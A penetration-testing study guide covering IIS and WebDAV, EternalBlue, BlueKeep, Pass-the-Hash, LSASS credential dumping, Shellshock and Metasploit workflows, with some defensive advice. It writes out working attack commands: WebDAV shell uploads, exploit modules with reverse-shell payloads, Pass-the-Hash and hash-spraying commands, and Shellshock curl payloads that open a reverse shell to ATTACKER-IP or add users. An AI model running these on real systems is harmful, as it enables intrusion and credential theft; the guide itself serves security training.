# Vulnerability Assessment
## IIS = Internet Information Services
**It is Microsoft’s official web server, just like:**

* Apache (Linux)
* Nginx (Linux/Unix)
* Lighttpd
* Tomcat (Java)

But IIS is Windows-based, built directly into Windows Server

**What IIS Does?**

IIS is used to host:

* Websites
* Web applications
* APIs
* Static files (HTML, CSS, JS)
* Dynamic applications (ASP.NET, .NET Core)

**It also supports:**

* FTP server
* SMTP server (older versions)
* WebDAV
* Application pools (isolated site processes)
* SSL/TLS certificates
* Logging & monitoring
* Windows authentication / Kerberos / NTLM

**Where IIS is used??**

IIS is extremely common in:

* Enterprises
* Government networks
* Corporate internal applications
* Active Directory environments
* Old legacy .NET applications

Many companies still run old vulnerable IIS versions like:

* IIS 6.0 (XP / Windows Server 2003) → many exploits
* IIS 7.5 (Windows Server 2008 R2)
* IIS 8 / 8.5
* IIS 10 (Windows Server 2016/2019/2022)

**Why Pentesters Care About IIS??**

Because IIS often exposes:

* Misconfigured authentication
* WebDAV write access
* Directory traversal
* File upload vulnerabilities
* ASPX shell upload
* Weak NTLM authentication
* Outdated modules

**Classic exploit example:**

Microsoft IIS 6.0 – WebDAV “PROPFIND” Remote Code Execution

Metasploit module:
```
exploit/windows/iis/iis_webdav_upload_asp
```
**How to Identify IIS**

* Using curl:
```
curl -I http://target
```

You may see:

Server: Microsoft-IIS/10.0

* Using nmap:
```
nmap -sV target
```

**Common Pentesting Techniques for IIS**

 1. Enumerate server version
```
nmap -p80,443 -sV target
```
2. Check for webdav
```
nmap --script http-webdav-scan -p80 target
```
3. Upload shell if WebDAV allows it
```
cadaver http://target
put shell.aspx
```
4. Exploit outdated IIS versions

Metasploit:
```
use exploit/windows/iis/iis_webdav_upload_asp
use exploit/windows/http/iis_webdav_scstoragepathfromurl
```
5. Enumerate authentication

Check NTLM info:
```
nmap --script http-ntlm-info -p80 target
```
**Summary**

| Feature            | IIS                                     |
| ------------------ | --------------------------------------- |
| Developer          | Microsoft                               |
| Platform           | Windows only                            |
| Purpose            | Host websites/web apps                  |
| Pentest importance | HIGH (many misconfigs, legacy exploits) |

---
## What is WebDAV?

**WebDAV (Web Distributed Authoring and Versioning)** is an extension of HTTP that allows clients to upload, edit, move, delete, and manage files on a web server.

Think of WebDAV as:

> “FTP over HTTP” — a file management protocol built on top of Apache or IIS.

It allows:

- Uploading files (PUT)
- Moving files (MOVE)
- Copying files (COPY)
- Creating folders (MKCOL)
- Editing files (PROPPATCH)
- Listing files (PROPFIND)
- Deleting files (DELETE)

**Why WebDAV Exists**

WebDAV helps with:

- Remote website content editing
- Shared storage
- Corporate document management
- Collaborative editing before cloud services existed

Common servers supporting WebDAV:

| Server                   | Notes                                      |
| ------------------------ | ------------------------------------------ |
| **Apache (mod_dav)**     | Linux                                      |
| **Microsoft IIS WebDAV** | Windows (VERY common and often vulnerable) |

**Why WebDAV is Important in Pentesting**

Because WebDAV allows file upload, misconfigurations can allow an attacker to:

- Upload a web shell
- Execute remote code
- Replace website files
- Write to restricted directories

WebDAV vulnerabilities often lead to full RCE.

Classic examples:

**IIS 6.0 WebDAV RCE:**
```
exploit/windows/iis/iis_webdav_scstoragepathfromurl
```
**Apache WebDAV upload shell:**

If PUT is allowed:
```
PUT shell.php
```
**How to Check if WebDAV is Enabled**
- 1. Nmap WebDAV scanner
```
nmap --script http-webdav-scan -p 80,443 target
```

You may see:
```
WebDAV enabled
Allowed Methods: OPTIONS, GET, HEAD, PUT, DELETE, PROPFIND, MKCOL
```
- 2. Check allowed HTTP methods
```
curl -X OPTIONS http://target/
```

Example vulnerable response:
```
DAV: 1,2
Allow: GET, HEAD, OPTIONS, PUT, DELETE, MOVE, COPY, MKCOL, PROPFIND
```

If PUT is present → you can upload files

If MOVE/COPY exist → you can bypass extension filtering

- 3. Manual WebDAV client
**Using cadaver:**
```
cadaver http://target
```

Then:
```
ls
put shell.php
```

**If upload succeeds → vulnerability.**

**Common WebDAV Exploitation Techniques**
- 1. Upload a Web Shell (PHP, ASPX, etc.)
Using curl:
```
curl -T shell.php http://target/uploads/
```

Check execution:
```
curl http://target/uploads/shell.php
```
- 2. Using MOVE to bypass extension filters (IIS trick)

Upload as .txt:
```
curl -T shell.txt http://target/uploads/shell.txt
```

Rename using MOVE:
```
curl -X MOVE -H "Destination:http://target/uploads/shell.aspx" \
     http://target/uploads/shell.txt
```

**If successful → you now uploaded an executable ASPX backdoor.**

This is how many IIS systems get compromised.

- 3. Using cadaver to exploit WebDAV
```
cadaver http://target
put evil.aspx
```
- 4. Metasploit WebDAV exploits
Scan:
```
use auxiliary/scanner/http/webdav_scanner
set RHOSTS target
run
```
IIS RCE exploit:
```
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS target
run
```
Upload file exploit:
```
use auxiliary/scanner/http/webdav_upload
```
**Why WebDAV Is Dangerous**

| Misconfiguration       | What it means                     |
| ---------------------- | --------------------------------- |
| PUT enabled            | Anyone can upload files           |
| No authentication      | Anonymous upload                  |
| MOVE/COPY enabled      | Bypass filters                    |
| Executable directories | Shell execution possible          |
| WebDAV on IIS 6.0      | Known remote code execution flaws |

**This makes WebDAV a web server backdoor for attackers.**

---

## Is EternalBlue Zero-Click? → YES

EternalBlue (MS17-010) is a remote code execution (RCE) vulnerability in SMBv1 that requires:

- No authentication
- No user interaction
- No clicks
- No valid credentials
- No session
- Just network access to port 445

This makes it a zero-click, unauthenticated remote exploit.

**Why EternalBlue is Zero-Click**

EternalBlue exploits a **memory corruption flaw** in the SMBv1 protocol.

SMB runs in the Windows kernel (**srv.sys**).
When a specially crafted SMB packet hits the machine:

- The SMB service immediately processes the request.
- The vulnerable function fails to validate a buffer.
- The attacker achieves remote code execution in kernel context.

**The victim does not need to do anything.** 
**The attacker only needs access to port 445.**

This is why worms like **WannaCry** spread extremely fast with no user interaction.

**EternalBlue Classification**
| Property        | EternalBlue     |
| --------------- | --------------- |
| Zero-click      | ✅ Yes           |
| Unauthenticated | ✅ Yes           |
| Remote exploit  | ✅ Yes           |
| Wormable        | ✅ Yes           |
| Privilege level | SYSTEM (kernel) |
| Attack vector   | SMBv1 packets   |

**What made EternalBlue so dangerous?**

- **SYSTEM-level shell** — kernel exploit.
- **Unauthenticated** — attacker doesn’t need login.
- **Zero-click** — victim does nothing.
- **Wormable** — automatically spreads to other vulnerable hosts.

This is why **WannaCry**, **NotPetya**, and **EternalRocks** caused global damage.

**Is EternalBlue still exploitable today?**
It depends:

- Unpatched Windows 7 / Server 2008 → vulnerable
- Windows 10 / 11 / Server 2016+ → patched (if SMBv1 is enabled manually, still risky)
- SMBv1 disabled entirely → safe

But many legacy systems still run SMBv1.

Use:
```
nmap --script smb-vuln-ms17-010 -p445 <target>
```

## What AutoBlue Actually Does

AutoBlue is a Python-based automation toolkit used to exploit EternalBlue (MS17-010) quickly and cleanly.

1. **Checks if the target is vulnerable**

Runs MS17-010 vulnerability detection.

2. **Prepares your payload**
   
Generates a custom shellcode payload using MSFVenom:
```
reverse shell
meterpreter
shellcode DLL
```
3. **Automatically patches the shellcode into the exploit**

EternalBlue requires shellcode to be embedded into the Python exploit.
AutoBlue edits this for you.

4. **Executes the EternalBlue exploit**

Runs EternalBlue against SMBv1 on port 445.

5. **Starts a listener automatically**

A Metasploit or netcat listener is spawned so the shell connects back.

**Why AutoBlue Exists**

The original EternalBlue exploit from Shadow Brokers was:

- messy
- included NSA tooling ("Fuzzbunch")
- used complicated shellcode embedding
- not beginner-friendly

AutoBlue solves these issues by making EternalBlue plug-and-play.

**Example AutoBlue Workflow**

**Step 1: Clone the repo**
```
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
cd AutoBlue-MS17-010
```

Inside you’ll see:
```
shellcode/
auto_blue.py
checker.py
eternalblue_exploit7.py
eternalblue_exploit8.py
listener_prep.sh
```
**Step 2: Check if the HOST is vulnerable**
```
python3 checker.py <target_ip>
```

If you see:
```
[*] Target is VULNERABLE to MS17-010
```
Continue.

**Step 3: Generate a payload**

AutoBlue includes a script that helps create shellcode:
```
cd shellcode
./shell_prep.sh
```

This creates a custom payload via msfvenom:
```
windows/x64/shell_reverse_tcp
```

It embeds your LHOST/LPORT automatically.

**Step 4: Launch the exploit**

Now run:
```
cd ..
python3 eternalblue_exploit7.py <target_ip>
```

Or for Windows 8/10:
```
python3 eternalblue_exploit8.py <target_ip>
```

If successful:
```
[*] Backdoor created!
[*] Triggering payload...
```
**Step 5: Catch the reverse shell**
Run:
```
nc -lvnp <port>
```

or Metasploit:
```
msfconsole
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST <your_ip>
set LPORT <your_port>
run
```

You'll receive a:
```
C:\Windows\system32>
```

shell.

**AutoBlue Summary Table**
| Stage             | AutoBlue Action                            |
| ----------------- | ------------------------------------------ |
| Recon             | Checks MS17-010 vulnerability              |
| Payload           | Auto-generates MSFVenom shellcode          |
| Preparation       | Patches shellcode into EternalBlue exploit |
| Exploit           | Automatically launches vulnerability       |
| Post-exploitation | Opens listener, gives shell                |

**When AutoBlue Works**
AutoBlue requires:

- Windows 7 → fully reliable
- Windows Server 2008 R2 → reliable
- SMBv1 enabled
- MS17-010 unpatched

It often fails on:

- Windows 10+
- Post-2008 servers
- Systems with SMBv1 disabled (default Windows 10+)
- Systems already patched with MS17-010

---
## What Is BlueKeep? (CVE-2019-0708)

BlueKeep is a critical remote code execution (RCE) vulnerability in **Microsoft Remote Desktop Services (RDS)**.
It is:

- Pre-authentication → attacker does NOT need credentials
- Wormable → can spread like WannaCry
- Remote → exploitable over the network
- Zero-interaction → zero-click exploit
- Affected systems include:
- Windows XP
- Windows Vista
- Windows 7
- Windows Server 2003
- Windows Server 2008
- Windows Server 2008 R2

**⚠️ Windows 10 and Server 2016/2019 are NOT vulnerable.**

**How Does BlueKeep Work? (Technical Explanation)**

- **It abuses an RDP component: “tsrv.sys” Terminal Services”**

Inside RDP, there is a channel called MS_T120 used for communication.

The vulnerability is caused by an integer underflow + heap overflow when the server processes a malicious RDP packet.

- **The attacker sends a specially-crafted RDP packet**
   
The packet triggers incorrect handling inside the ChannelJoinRequest logic.

This leads to:

 - Memory corruption
 - Arbitrary code execution
 - SYSTEM-level privileges

- **Because this happens before login → it's pre-auth RCE**

There is no need for **username, password, or interaction**.

This is what makes BlueKeep **zero-click** and extremely dangerous.

**Why Is BlueKeep Considered “Wormable”?**

Just like EternalBlue → WannaCry
BlueKeep has all ingredients for a worm:

- No authentication required
- Exposed RDP ports on internet (TCP 3389)
- Full SYSTEM privileges after exploitation

A worm could:

- Scan IP ranges
- Auto-exploit machines
- Propagate automatically
- Drop ransomware

Microsoft themselves said BlueKeep could cause a **wormable global attack**.

**How BlueKeep Is Exploited (Step-by-step)**
1. Scan for vulnerable hosts

Using Nmap:
```
nmap -p 3389 --script rdp-vuln-ms19-0708 <target>
```

Or Metasploit:
```
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <target>
run
```
2. If vulnerable, attacker uses a BlueKeep exploit

Metasploit module:
```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <target>
set RPORT 3389
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your-ip>
run
```

> NOTE:
> BlueKeep is unstable — often causes **blue screen (BSOD)** because exploitation requires precise memory grooming.

3. On success: SYSTEM shell

If the exploit works, attacker gets:

- Meterpreter
- With NT AUTHORITY\SYSTEM privileges
- Complete machine takeover

**Why is the exploit unstable?**

Because BlueKeep RCE requires:

- Precise heap grooming
- Exact alignment of memory structures
- Correct prediction of allocation sizes

If the memory layout is even slightly different → **BSOD**.

This is why Metasploit labels it **“EXPERIMENTAL / DANGEROUS”**.

**How to Patch BlueKeep**

Microsoft released patches even for EOL systems:

| OS                       | Status          |
| ------------------------ | --------------- |
| Windows 7                | Patch available |
| Windows Server 2008 / R2 | Patch available |
| Windows XP               | Patch available |
| Windows Server 2003      | Patch available |

Also recommended:

- Disable RDP if not needed
- Enable Network Level Authentication (NLA)
- Use firewalls to restrict 3389

**Is BlueKeep still relevant today?**
Yes — because:

- Many servers are still running Windows 7/2008
- Pentesters still encounter legacy machines
- BlueKeep is part of RDP exploitation training
- Exploit teaches heap grooming + RCE concepts

But on modern networks (Windows 10/11) → **not exploitable**.


BlueKeep = Pre-auth RDP remote code execution that is wormable, zero-click, and capable of full SYSTEM takeover on old Windows systems.
  ---
## What Is Pass-the-Hash (PtH)?

Pass-the-Hash (PtH) is a technique where an attacker authenticates to a Windows system using the NTLM password hash instead of the actual plaintext password.

- You don’t need the user's real password
- You only need their NTLM hash
- Windows accepts the hash as if it were the correct password

This is possible because NTLM authentication uses challenges/responses that rely directly on the hash, not the plaintext password.

**Why Does Pass-the-Hash Work? (Windows Authentication Weakness)**

When using NTLM authentication, Windows does NOT send the actual password across the network. Instead:

- Server sends a random challenge
- Client encrypts that challenge using the NTLM hash
- Server verifies the encrypted result

❗ If you have the hash → you can generate the correct authentication response → no need to know the password.

This is why attackers love PtH.

**When is PtH used?**

Usually during post-exploitation, after you already have:

- a foothold on a machine
- ability to dump password hashes

PtH is used for:

- Lateral movement
- Privilege escalation
- Accessing other machines in the domain
- Pivoting toward domain controllers

**Where Do Attackers Get Password Hashes?**

Common tools:

➤ Mimikatz
```
sekurlsa::logonpasswords
```
➤ Pwdump / Hashdump

Metasploit:
```
hashdump
```
➤ Impacket-secretsdump
```
secretsdump.py user:pass@target
```

Once hashes are obtained → PtH is possible.

**How Pass-the-Hash Is Performed (Real Commands)**

1️. Using Impacket: `psexec.py` (Most Popular)
```
psexec.py administrator@192.168.1.10 -hashes <NTLM>:<NTLM>
```

Example:
```
psexec.py administrator@10.10.10.5 -hashes 8846f7eaee8fb117ad06bdd830b7586c:8846f7eaee8fb117ad06bdd830b7586c
```

If successful → you get a SYSTEM shell.

2️. Using Impacket: `smbexec.py`
```
smbexec.py DOMAIN/administrator@192.168.1.10 -hashes <NTLM>:<NTLM>
```
3️. Using Impacket: `wmiexec.py`

Stealthier because it uses WMI and avoids writing a service.
```
wmiexec.py administrator@192.168.1.10 -hashes <NTLM>:<NTLM>
```
4️. Using CrackMapExec (CME)

CME is built for large-scale PtH.
```
crackmapexec smb 192.168.1.0/24 -u administrator -H <NTLM hash>
```

To spray a hash across an entire subnet.

5️. Using Metasploit
Load NTLM hash into session:
```
set SMBUser administrator
set SMBPass <NTLM hash>
set SMBPassIsHash true
```

Then run modules like:
```
use exploit/windows/smb/psexec
run
```
Example: PtH Against SMB Share
```
smbclient //10.10.10.5/C$ -U Administrator --pw-nt-hash <hash>
```
**Why PtH Is So Dangerous**

- No password cracking required
- Even long/complex passwords do NOT protect you
- Reusable hash = equivalent to password
- Works across the network
- Works even after the user denies knowing their password

If an attacker gets one domain admin hash → domain takeover.

**How to Prevent Pass-the-Hash (Defensive Notes)**

✔ Use Kerberos instead of NTLM

Kerberos does NOT use password hashes for login in the same way.

✔ Enable Credential Guard

Stops LSASS from exposing hashes on modern Windows versions.

✔ Local Admin Password Solution (LAPS)

Rotates each machine’s local admin password.

✔ Disable SMBv1

Old SMB versions make PtH easier.

✔ Use “Protected Users” group

Prevents credential caching.

**Summary Cheat Sheet (Perfect for Notes / GitHub)**
| Concept  | Meaning                                              |
| -------- | ---------------------------------------------------- |
| PtH      | Using NTLM hash to authenticate instead of password  |
| Requires | NTLM hash (from LSASS, SAM, secretsdump, etc.)       |
| Tools    | Impacket (psexec, smbexec, wmiexec), CME, Metasploit |
| Targets  | SMB, WMI, WinRM, RDP (with restricted admin mode)    |
| Danger   | One hash = full access, lateral movement             |
| Defense  | Kerberos, Credential Guard, LAPS, disable NTLM       |
---
## Badblue

**BadBlue** is a small, lightweight Windows-based web server that became well-known in cybersecurity because multiple versions of it were vulnerable to **remote code execution (RCE)** and directory traversal attacks.

**Quick Definition**

>BadBlue is a Windows web server (similar to IIS or Apache) that supports HTTP file sharing, CGI scripts, and PHP — but contains several serious vulnerabilities that allow attackers to gain remote access and execute code.

**Purpose (Original Use)**

- Originally, BadBlue was created as:
- A file-sharing server
- A simple personal web server
- An easy way to host PHP websites

It was marketed toward home users — not enterprise security. That explains why security was weak.

**Why Is BadBlue Exploitable?**

Older versions (like BadBlue 2.7.0) have vulnerabilities such as:
| Vulnerability Type          | Impact                                     |
| --------------------------- | ------------------------------------------ |
| Directory Traversal         | Read system files (SAM, config, passwords) |
| Remote Code Execution (RCE) | Run commands on the system                 |
| CGI/PHP exploitation        | Upload webshells                           |
| Authentication bypass       | No login required for admin functions      |
| Buffer Overflows            | Crash or take control of the process       |

Because BadBlue runs as a Windows service, exploits often lead to:

- SYSTEM-level access
- Full machine takeover

**Example Exploit Used in Training**
Metasploit module:
```
exploit/windows/http/badblue_passthru
```
This module:

- Uploads a malicious `.php` file (reverse shell)
- Executes it through the vulnerable handler
- Gives you a Meterpreter session

**Why Cybersecurity Labs Use BadBlue**
BadBlue is popular in lab and exam environments because:

- Has multiple teachable vulnerabilities
- Easy to exploit manually or using Metasploit
- Exists in older systems like Windows XP → Server 2003 era
- Perfect example of post-exploitation workflow:
```
RCE → Meterpreter → migrate → dump hashes → lateral movement
```
**Is BadBlue Still Used Today?**

Very rarely.

Modern Windows environments do not use BadBlue because:

- No security updates
- Legacy architecture
- Known CVEs
- Default configuration insecure

So it’s essentially a learning platform relic used to:

- Practice exploitation
- Learn enumeration
- Train OSCP/eJPT skills

**Summary Cheat Sheet**
| Feature                    | Value                                               |
| -------------------------- | --------------------------------------------------- |
| Type                       | Windows web server                                  |
| Purpose                    | File sharing + PHP hosting                          |
| Common Versions            | 2.5–2.7                                             |
| Why used in security labs? | Vulnerable to RCE, weak authentication              |
| Typical attack path        | Enumerate → Exploit → Shell → PrivEsc → Dump hashes |
---

## Why "Migrate" Exists in Meterpreter
When you exploit a Windows machine and get a **Meterpreter session**, your payload is running **inside a process**.

Example:

- Exploit a vulnerable web server → payload runs inside `httpd.exe`
- Exploit a bad PHP upload → payload runs inside `php-cgi.exe`

These processes:

- ❌ May crash
- ❌ May be restarted by the service
- ❌ May have low privileges ("IIS APPPOOL", "NETWORK SERVICE")
- ❌ May not allow certain Meterpreter operations (hash dumping, persistence, etc.)

So instead, we migrate Meterpreter into a more stable and privileged process (like `explorer.exe`, `winlogon.exe`, or `lsass.exe`).

**What Migration Does (Technically)**

Meterpreter:

- Injects a new payload (shellcode) into another running process (using Windows API: `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`)
- The new process loads the Meterpreter stager
- The old process payload safely exits

So instead of running inside a fragile web process, you now run inside a system process.

**Benefits of Migrating**
| Benefit                    | Explanation                                            |
| -------------------------- | ------------------------------------------------------ |
| Stability                  | If original process crashes, your Meterpreter survives |
| Privilege Escalation       | Many system processes run as **SYSTEM** user           |
| Access to sensitive memory | Needed for dumping hashes, tokens, credentials         |
| Persistence                | Migrating to `explorer.exe` ensures long-term access   |
| Credential harvesting      | Some processes store authentication tokens             |
---

## What Is LSASS?

`lsass.exe` stands for:
>Local Security Authority Subsystem Service

It is one of the most critical Windows processes responsible for:

- 🔐 Authentication
- 🔑 Storing password hashes
- 👤 Managing user logins
- 🪪 Kerberos + NTLM authentication
- 💾 Handling DPAPI secrets

Windows stores authentication material in LSASS memory, including:

| Credential Type            | Stored in LSASS                 |
| -------------------------- | ------------------------------- |
| NTLM hashes                | ✅ Yes                           |
| LM hashes                  | Sometimes                       |
| Kerberos tickets (TGT/TGS) | ✅ Yes                           |
| Cached credentials         | Yes                             |
| Plaintext passwords        | Sometimes (depending on config) |

**Why Hackers Care About LSASS**

Because LSASS holds everything needed to impersonate users or escalate privileges, including:

- NTLM Hashes → **Pass-the-Hash**
- Kerberos TGT → **Pass-the-Ticket**
- Plaintext creds (if WDigest enabled)

Once LSASS is accessed, you basically own the domain.

**Workflow in Real Attacks**
```
Exploit → Meterpreter shell → migrate → dump creds → lateral movement → privilege escalation → persistence
```
Example commands:
```
meterpreter > ps
meterpreter > migrate 1234     # (into lsass.exe or explorer.exe)
meterpreter > load kiwi        # Mimikatz module
meterpreter > creds_all
meterpreter > hashdump
```
**Why LSASS Requires SYSTEM Privileges**
Because LSASS is protected — only high-privileged processes can:

- Read its memory
- Inject code
- Dump credentials

So you often migrate first into a **SYSTEM-level process** such as:

- `lsass.exe`
- `winlogon.exe`
- `services.exe`
- `svchost.exe`

**Modern Protections Against LSASS Attacks**
Windows added defenses including:
| Feature                          | Purpose                                    |
| -------------------------------- | ------------------------------------------ |
| Credential Guard                 | Virtualizes LSASS to block hash extraction |
| LSASS as protected process (PPL) | Prevents code injection                    |
| LSA Iso                          | Stores sensitive secrets separately        |

But many environments still lack these protections — especially lab and enterprise legacy systems.

**Summary**
| Concept           | Meaning                                                           |
| ----------------- | ----------------------------------------------------------------- |
| Migration         | Move Meterpreter to a better process for stability and privileges |
| Why migrate?      | To avoid crash, gain SYSTEM rights, and access credentials        |
| LSASS             | Windows process storing authentication secrets                    |
| Why target LSASS? | Contains hashes, Kerberos tickets, login creds → full control     |
---
## What Is Shellshock?

Shellshock is a **remote code execution (RCE)** vulnerability discovered in GNU Bash in 2014.

It affects how Bash handles environment variables, specifically function definitions inside environment variables.

**Vulnerable Bash behavior:**

Bash incorrectly executes any code following a function definition.

Example of a malicious environment variable:
```
env x='() { :; }; echo vulnerable' bash -c "echo test"
```

If the system is vulnerable, it will run:
```
vulnerable
test
```

The `echo vulnerable` part was not supposed to run — that’s the vulnerability.

**Why Is It Dangerous?**

Because environment variables are passed through:

- CGI scripts on web servers
- DHCP clients
- SSH forced commands
- Git, Subversion, and other software

If any external input reaches Bash → attacker gets **remote command execution**.

**How Shellshock Works (Technically)**

A Bash function can be stored inside an environment variable:
```
x='() { echo hello; }'
export x
```

This is valid.

But Bash incorrectly allowed extra text after the function:
```
x='() { :; }; whoami'
export x
```

When Bash loads this environment variable:

- It loads the function definition (`() { :; };`)
- Then executes the remaining text (`whoami`)

This leads to **arbitrary code execution**.

**Shellshock in Web Servers (Most Common Exploitation)**

Many old Apache servers use **mod_cgi** or **mod_cgid**.

CGI scripts pass **HTTP headers as environment variables.**

So the attacker injects malicious env variables through headers like:

- `User-Agent`
- `Referer`
- `Cookie`

Example exploit:
```
curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "id"' \
http://victim.com/cgi-bin/status
```

If vulnerable, output:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This means **RCE achieved over HTTP**.

**Shellshock Detection Commands**

Local test:
```
env x='() { :; }; echo vulnerable' bash -c :
```

Remote web test:
```
curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "id"' http://site/cgi-bin/test
```

Nmap NSE script:
```
nmap -sV --script=http-shellshock --script-args uri=/cgi-bin/status 10.10.10.10
```
**Shellshock Exploitation Examples**
1. Reverse Shell
```
curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"' \
http://victim/cgi-bin/admin
```
2. Add a new user
```
curl -H 'Cookie: () { :; }; /bin/bash -c "useradd hacker -p password"' \
http://victim/cgi-bin/login
```
3. Read sensitive files
```
curl -H 'Referer: () { :; }; /bin/bash -c "cat /etc/passwd"' \
http://victim/cgi-bin/info
```
**Systems Affected**

- Linux systems using Bash <4.3
- MacOS (older versions)
- Embedded devices with Bash
- Any web server using CGI scripts calling Bash
- DHCP clients that use /bin/bash

**Fixing Shellshock**

Patch Bash:
```
sudo apt-get update
sudo apt-get install --only-upgrade bash
```

Or validate with:
```
bash --version
```

Safe Bash versions will ignore malicious content after function definitions.
**Summary**
| Concept           | Explanation                                                                |
| ----------------- | -------------------------------------------------------------------------- |
| Vulnerability     | Bash executes extra commands placed after function definitions in env vars |
| Impact            | Remote Code Execution (RCE)                                                |
| Attack vectors    | CGI scripts, SSH, DHCP                                                     |
| Exploit mechanism | Inject malicious code into an environment variable                         |
| Example header    | `User-Agent: () { :; }; /bin/bash -c "id"`                                 |
| Fix               | Patch Bash to latest version                                               |
---
## Nessus + Metasploit
Nessus and Metasploit solve different parts of the penetration-testing process:
| Tool           | Purpose                              | Strength                                           |
| -------------- | ------------------------------------ | -------------------------------------------------- |
| **Nessus**     | Vulnerability *scanning & detection* | Very accurate CVE detection, large plugin coverage |
| **Metasploit** | Exploitation & post-exploitation     | Thousands of exploits, payloads & automation       |

When combined:
>Nessus finds weaknesses → Metasploit exploits them → Meterpreter gives control.

**1. What Nessus Does**

Nessus performs:

- Port scanning
- Service fingerprinting
- Vulnerability scanning (CVE detection)
- Misconfiguration detection
- Patch-level checks
- Password policy checks
- Web server scanning
- SMB, FTP, SSH security testing

Nessus finds things like:

- EternalBlue (MS17-010)
- Shellshock
- Apache Struts RCE
- SMB null sessions
- Default credentials
- Weak TLS configs
- WebDAV authentication

>Nessus is NOT an exploitation tool. It only reports vulnerabilities.

**2. What Metasploit Does**

Metasploit is used for:

- Exploitation
- Payload delivery
- Post-exploitation
- Pivoting
- Looting hashes, tokens, credentials
- Privilege escalation
- Module-based automation

Example tasks:

- Exploit SMB vulnerabilities (EternalBlue)
- Exploit WebDAV upload execution flaws
- Exploit outdated Apache, Samba, IIS, Tomcat
- Brute-force passwords
- Enumerate SMB, FTP, SSH, SNMP, MSSQL
- Dump hashes (lsass, SAM, NTDS)
- Create persistence

### 3. Integrating Nessus with Metasploit (The Real Power)

**Step 1 — Run a Nessus Scan**

Select:

- Basic Network Scan
- Advanced Scan
- Web Application Test

Save results as:
```
Nessus .nessus file
```
Example:
```
scan-results.nessus
```
**Step 2 — Import Nessus Scan into Metasploit**

In Metasploit:
```
msfconsole
```

Then import:
```
db_import scan-results.nessus
```

You’ll see:
```
[*] Importing Nessus results...
[*] Hosts created...
[*] Services created...
[*] Vulnerabilities created...
```

Metasploit now knows:

- Open ports
- Services
- CVEs
- Vulnerability signatures

This allows automatic exploitation.

**Step 3 — View Vulnerabilities Inside Metasploit**
```
vulns
```

Example output:
| Host         | Port | Vuln       | Info                 |
| ------------ | ---- | ---------- | -------------------- |
| 192.168.1.10 | 445  | MS17-010   | EternalBlue detected |
| 192.168.1.10 | 80   | Shellshock | Bash CGI vulnerable  |

**Step 4 — Match Vulnerabilities to Metasploit Modules**
Once Nessus shows vulnerabilities, use:
```
search CVE-2017-0144
```
or
```
search type:exploit name:ms17_010
```
Metasploit shows exact exploit modules.

**Step 5 — Exploit Directly Based on Nessus Data**
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5
run
```
Boom — **meterpreter session opened**.

**Why Nessus + Metasploit Is So Powerful**
| Nessus                 | Metasploit                      |
| ---------------------- | ------------------------------- |
| Finds vulnerabilities  | Exploits vulnerabilities        |
| Big detection database | Big exploit database            |
| Accurate scanning      | Real-world exploitation         |
| Easy & automatic       | Manual + automatic exploitation |
| No exploitation        | Full post-exploitation          |

Together, they create:
```
Vulnerability → Exploit → Privilege Escalation → Report
```

**Nessus vs Metasploit — Quick Summary Table**
| Feature                    | Nessus     | Metasploit |
| -------------------------- | ---------- | ---------- |
| Port scanning              | ✔          | ✔          |
| Vulnerability scanning     | ✔          | ✘          |
| Exploitation               | ✘          | ✔          |
| Post exploitation          | ✘          | ✔          |
| Hash dumping               | ✘          | ✔          |
| Pivoting                   | ✘          | ✔          |
| Reporting                  | ✔ built-in | ✘          |
| Network discovery          | Good       | Average    |
| Practical security testing | Medium     | Excellent  |
---

## WMAP in Metasploit

WMAP = Web Application Mapping
WMAP is Metasploit’s built-in web vulnerability scanning framework.

Think of it as:

>Burp Scanner + Nikto + Dirb but built inside Metasploit.

Using WMAP, you can:

- Scan websites for vulnerabilities
- Pass the results directly to Metasploit exploit modules
- Automate discovery & exploitation

**Why WMAP Exists in Metasploit**

Metasploit = exploitation

WMAP = web vulnerability scanning

Nmap → network vulnerability scanning

WMAP → web vulnerability scanning

>WMAP helps you find vulnerabilities, and Metasploit helps you exploit them.

**How WMAP Works**

WMAP requires:

- A workspace
- A web target added
- A scanner plugin loaded
- A scan profile configured
- Scan run
- Results examined
- Exploit modules launched automatically

**Final Workflow Summary**
| Stage        | Tool        | Purpose                             |
| ------------ | ----------- | ----------------------------------- |
| Recon        | Nmap        | Port & service discovery            |
| Web recon    | WMAP        | Directory + vulnerability discovery |
| Exploit      | Metasploit  | Full exploitation                   |
| Post-exploit | Meterpreter | PrivEsc + Lsass + Pivoting          |

**Advantages of Using WMAP**
| Feature                         | Benefit                         |
| ------------------------------- | ------------------------------- |
| Built into Metasploit           | No 3rd-party tools needed       |
| Works with meterpreter sessions | Automatic exploitation          |
| Scans entire web applications   | Good for entry-level pentesters |
| Integrates with db              | Saves results for reporting     |
| Faster than manual testing      | Automates repetitive tasks      |
| Does not crash most servers     | Safe scanning                   |

**Limitations of WMAP**

WMAP is not as advanced as Burp Suite Pro or OWASP ZAP.

It does basic scanning, not advanced:

- No authenticated scanning
- No fuzzing
- No CSRF detection
- No WAF bypass techniques
---
## WMAP vs Nuclei — Which One Is Better for Pentesting?
**TL;DR (Quick Verdict)**
| Feature           | **WMAP**                        | **Nuclei**                          |
| ----------------- | ------------------------------- | ----------------------------------- |
| Modern?           | ❌ Old, deprecated               | ✅ Modern, actively developed        |
| Coverage          | Basic web scanning              | Massive library (10,000+ templates) |
| Detection quality | Low–Medium                      | High                                |
| Customization     | Very limited                    | Extremely customizable              |
| Speed             | Slow-Medium                     | Very fast (parallel scanning)       |
| Ideal for         | Training, Metasploit automation | Real pentests, bug bounties         |
| eJPT relevance    | ⭐ Good                          | ⭐⭐ Very good                        |
| OSCP relevance    | ⭐ Good                          | ⭐⭐⭐ Excellent                       |
| Real-world value  | ⭐                               | ⭐⭐⭐⭐⭐                               |

>Winner: Nuclei (by a huge margin)

